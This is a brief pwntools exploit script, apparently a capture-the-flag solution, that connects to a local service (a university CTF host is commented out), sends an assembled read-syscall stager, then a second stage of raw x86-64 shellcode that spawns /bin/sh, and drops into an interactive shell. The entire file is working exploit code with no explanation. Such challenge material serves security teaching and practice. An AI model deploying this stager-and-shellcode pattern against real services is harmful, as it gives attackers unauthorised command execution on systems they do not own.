from pwn import *

r = remote("127.0.0.1", 8888)
#r = remote("ctf.adl.csie.ncu.edu.tw", 11004)
#context.arch = "amd64"


r.recvuntil(":)\n")
payload = asm(
"""
push rax
pop rdi
push rdx
pop rsi
syscall
""", arch="amd64")
r.send(payload)

r.recv()
r.sendline("a" * 6 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")

r.interactive()

